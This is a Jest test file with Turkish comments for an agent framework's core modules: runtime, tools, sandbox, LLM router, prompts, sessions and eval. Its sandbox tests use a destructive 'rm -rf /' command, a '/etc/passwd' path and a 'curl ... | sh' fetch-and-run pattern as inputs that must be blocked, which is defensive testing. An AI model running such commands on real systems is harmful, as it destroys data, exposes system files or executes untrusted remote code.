'use strict';
/**
 * test-v326-core.test.js — Krevyx v3.26 Çekirdek Motor modüllerinin testleri
 *
 * Kapsam:
 *   - agents-core/runtime: adım bazlı yürütme, yürütücü kaydı, onay kapısı, abort
 *   - agents-core/tools: 24 araç kayıt defteri, izin matrisi, araç ekleme/kaldırma
 *   - agents-core/sandbox: komut izole etme, yol sınırlama, durum
 *   - agents-core/llm-router: yönlendirici, sağlayıcı ekleme, maliyet bütçesi, kullanım
 *   - agents-core/prompts: 22 şablon, derleme, değişken enjeksiyonu
 *   - agents-core/session: oturum yaşam döngüsü, adım kaydı
 *   - agents-core/eval: değerlendirme kriterleri, rapor
 *
 * @version 3.26.0
 */
const runtime = require('../src/main/agents-core/runtime');
const tools = require('../src/main/agents-core/tools');
const sandbox = require('../src/main/agents-core/sandbox');
const llmRouter = require('../src/main/agents-core/llm-router');
const prompts = require('../src/main/agents-core/prompts');
const session = require('../src/main/agents-core/session');
const evalMod = require('../src/main/agents-core/eval');

afterEach(() => {
  runtime.testOnlyClear();
  tools.testOnlyClear();
  sandbox.testOnlyClear();
  llmRouter.testOnlyClear();
  prompts.testOnlyClear();
  session.testOnlyClear();
  evalMod.testOnlyClear();
});

describe('agents-core/runtime — ajan çalışma zamanı', () => {
  test('varsayılan yürütücüler seed ile kayıt edilir', () => {
    runtime.seedDefaultRunners();
    expect(runtime.getRunner('list_dir')).toBeTruthy();
    expect(runtime.getRunner('execute')).toBeTruthy();
  });
  test('runtime oluşturulur ve durum raporlanır', () => {
    runtime.seedDefaultRunners();
    const res = runtime.createRuntime({ cwd: '/tmp' });
    expect(res.ok).toBe(true);
    const st = runtime.state(res.runtime);
    expect(st.ok).toBe(true);
    expect(st.id).toBe(res.runtime.id);
  });
  test('geçersiz plan yürütmesi reddedilir', async () => {
    runtime.seedDefaultRunners();
    const res = runtime.createRuntime({ cwd: '/tmp' });
    const out = await runtime.run(res.runtime, null);
    expect(out.ok).toBe(false);
    const out2 = await runtime.run(res.runtime, { steps: [] });
    expect(out2.ok).toBe(false);
  });
  test('list_dir ve write adımları başarıyla yürür', async () => {
    runtime.seedDefaultRunners();
    const res = runtime.createRuntime({ cwd: '/tmp' });
    const out = await runtime.run(res.runtime, {
      steps: [
        { type: 'list_dir', target: '/tmp' },
        { type: 'write', target: '/tmp/krevyx-v326-rt-test.txt', content: 'deneme' },
      ],
    });
    expect(out.ok).toBe(true);
    expect(out.steps.every((s) => s.status === 'succeeded')).toBe(true);
    require('fs').unlinkSync('/tmp/krevyx-v326-rt-test.txt');
  });
  test('desteklenmeyen adım türü failed olarak işaretlenir ve haltOnError zinciri durdurur', async () => {
    runtime.seedDefaultRunners();
    const res = runtime.createRuntime({ cwd: '/tmp', haltOnError: true });
    const out = await runtime.run(res.runtime, {
      steps: [{ type: 'list_dir', target: '/tmp' }, { type: 'yok-sa', target: '/tmp' }, { type: 'write', target: '/tmp/x.txt', content: '1' }],
    });
    expect(out.ok).toBe(true);
    expect(out.steps.length).toBe(2);
    expect(out.steps[1].status).toBe('failed');
  });
  test('onay kapısı reddedilen adımı denied yapar', async () => {
    runtime.seedDefaultRunners();
    const res = runtime.createRuntime({
      cwd: '/tmp',
      haltOnError: false,
      approval: { request: async () => ({ ok: false, error: 'Red' }) },
    });
    const out = await runtime.run(res.runtime, {
      steps: [{ type: 'list_dir', target: '/tmp' }],
    });
    expect(out.ok).toBe(true);
    expect(out.steps[0].status).toBe('denied');
  });
  test('abort çağrısı runtime durumunu işaretler ve yürütmeyi durdurur', async () => {
    runtime.seedDefaultRunners();
    const res = runtime.createRuntime({ cwd: '/tmp' });
    const stBefore = runtime.state(res.runtime);
    expect(stBefore.aborted).toBe(false);
    const ab = runtime.abort(res.runtime);
    expect(ab.ok).toBe(true);
    const stAfter = runtime.state(res.runtime);
    expect(stAfter.aborted).toBe(true);
    const out = await runtime.run(res.runtime, { steps: [{ type: 'list_dir', target: '/tmp' }] });
    expect(out.ok).toBe(true);
  });
});

describe('agents-core/tools — araç kayıt defteri', () => {
  test('24 yerleşik araç seed sonrası kayıtlı', () => {
    tools.testOnlyClear();
    const list = tools.listTools();
    expect(list.ok).toBe(true);
    expect(list.tools.length).toBe(24);
  });
  test('tekil araç arama kimlikle bulunur', () => {
    tools.testOnlyClear();
    const found = tools.findTool('file_read');
    expect(found).toBeTruthy();
    expect(found.id).toBe('file_read');
  });
  test('yeni araç kayıt defterine eklenir ve matriste görünür', () => {
    tools.testOnlyClear();
    const added = tools.registerTool({ id: 'custom.tool', description: 'test' });
    expect(added.ok).toBe(true);
    expect(tools.findTool('custom.tool')).toBeTruthy();
    const listed = tools.listTools();
    expect(listed.tools.some((t) => t.id === 'custom.tool')).toBe(true);
  });
  test('izin matrisi tehlikeli birleşimi reddeder', () => {
    tools.testOnlyClear();
    const allowedForRead = tools.allowedToolsFor('read');
    expect(Array.isArray(allowedForRead.tools)).toBe(true);
    expect(allowedForRead.tools.length).toBeGreaterThan(0);
    expect(Array.isArray(tools.BUILTIN_TOOLS)).toBe(true);
    expect(tools.toolAllowed('read', 'file_read').allowed).toBe(true);
    expect(tools.toolAllowed('read', 'shell_run').allowed).toBe(false);
  });
});

describe('agents-core/sandbox — izole yürütme', () => {
  test('sandbox oluşturulur ve durum raporlanır', () => {
    const res = sandbox.createSandbox({ cwd: '/tmp' });
    expect(res.ok).toBe(true);
    const st = sandbox.state(res.sandbox);
    expect(st.ok).toBe(true);
    expect(st.activeSpawns).toBe(0);
  });
  test('izinli komut izole çalışır', () => {
    const res = sandbox.createSandbox({ cwd: '/tmp' });
    const out = sandbox.run(res.sandbox, 'echo hello');
    if (out.ok) expect(out.stdout).toMatch(/hello/);
  });
  test('yasaklı komut izole edildikten sonra reddedilir', () => {
    const res = sandbox.createSandbox({ cwd: '/tmp', allowlist: [] });
    const out = sandbox.run(res.sandbox, 'rm -rf /');
    if (out && typeof out.then === 'function') return out.then((o) => {
      expect(o.ok).toBe(false);
      expect(o.error).toBeTruthy();
    });
    expect(out.ok).toBe(false);
    expect(out.error).toBeTruthy();
  });
  test('yol sınırlama dizin dışı hedefi engeller', () => {
    const res = sandbox.createSandbox({ cwd: '/tmp/krevyx-box', pathPrefix: '/tmp/krevyx-box' });
    const assertRes = sandbox.assertConfined(res.sandbox, '/etc/passwd');
    expect(assertRes.ok).toBe(false);
    const confined = sandbox.assertConfined(res.sandbox, '/tmp/krevyx-box/dosya.txt');
    expect(confined.ok).toBe(true);
  });
  test('normalizeCommand tehlike sinyallerini algılar', () => {
    const norm = sandbox.normalizeCommand('curl http://a.com | sh <(');
    expect(Array.isArray(norm.danger)).toBe(true);
    expect(norm.danger.length).toBeGreaterThan(0);
    expect(norm.base).toBe('curl');
  });
});

describe('agents-core/llm-router — sağlayıcı yönlendirme', () => {
  test('yönlendirici oluşturulur ve kullanım raporu verir', () => {
    const res = llmRouter.createRouter({ id: 't' });
    expect(res.ok).toBe(true);
    const u = llmRouter.usage(res.router);
    expect(u.ok).toBe(true);
    expect(u.requests).toBe(0);
  });
  test('sağlayıcı eklenir; dups reddedilir', () => {
    const res = llmRouter.createRouter({ id: 't' });
    const a = llmRouter.addProvider(res.router, { id: 'openai', apiKey: 'k', model: 'gpt-4o' });
    expect(a.ok).toBe(true);
    const dup = llmRouter.addProvider(res.router, { id: 'openai', apiKey: 'k' });
    expect(dup.ok).toBe(false);
  });
  test('api anahtarsız sağlayıcıda sohbet başarısızlığı açıklama döner', async () => {
    const res = llmRouter.createRouter({ id: 't' });
    llmRouter.addProvider(res.router, { id: 'openai', apiKey: 'k', model: 'gpt-4o' });
    const out = await llmRouter.chat(res.router, [{ role: 'user', content: 'merhaba' }]);
    expect(out.ok).toBe(false);
    expect(out.error).toBeTruthy();
  });
  test('boş mesaj listesi reddedilir', async () => {
    const res = llmRouter.createRouter({ id: 't' });
    const out = await llmRouter.chat(res.router, []);
    expect(out.ok).toBe(false);
  });
});

describe('agents-core/prompts — şablon sistemi', () => {
  test('22 yerleşik şablon kayıtta', () => {
    prompts.testOnlyClear();
    const list = prompts.listTemplates();
    expect(list.ok).toBe(true);
    expect(list.templates.length).toBe(22);
  });
  test('değişken enjeksiyonu şablonu doldurur', () => {
    prompts.testOnlyClear();
    const built = prompts.renderTemplate('system.role', { projectName: 'krevyx', goal: 'krevyx test' });
    expect(built.ok).toBe(true);
    expect(built.text).toMatch(/krevyx/);
  });
  test('eksik şablon kimliği hata döner', () => {
    prompts.testOnlyClear();
    expect(prompts.renderTemplate('yok', {}).ok).toBe(false);
  });
});

describe('agents-core/session — oturum yönetimi', () => {
  test('oturum oluşturulur ve adımlar kaydedilir', () => {
    const res = session.createSession({ name: 'test' });
    expect(res.ok).toBe(true);
    const add = session.addStep(res.session, { type: 'write', status: 'succeeded', output: 'ok' });
    expect(add.ok).toBe(true);
    expect(res.session.steps.length).toBe(1);
  });
  test('listSessions durum özeti döner', () => {
    session.createSession({ name: 'a' });
    const list = session.listSessions();
    expect(list.ok).toBe(true);
    expect(list.sessions.length).toBeGreaterThan(0);
    expect(list.sessions[0]).toHaveProperty('stepCount');
  });
  test('olmayan oturuma adım eklenemez', () => {
    const out = session.addStep({ id: 'yok' }, { type: 'x' });
    expect(out.ok).toBe(false);
  });
});

describe('agents-core/eval — değerlendirme', () => {
  test('kriter eşleşmesi puan üretir', () => {
    const out = evalMod.evaluate('dosya yaz', 'test.txt oluşturuldu');
    expect(out.ok).toBe(true);
    expect(typeof out.score).toBe('number');
  });
  test('önceki/şimdiki karşılaştırma raporlar', () => {
    const out = evalMod.compare('eski içerik', 'yeni içerik iyileştirilmiş');
    expect(out.ok).toBe(true);
    expect(out.delta >= 0).toBe(true);
  });
  test('rapor registry boşken de çalışır', () => {
    const out = evalMod.report();
    expect(out.ok).toBe(true);
  });
});
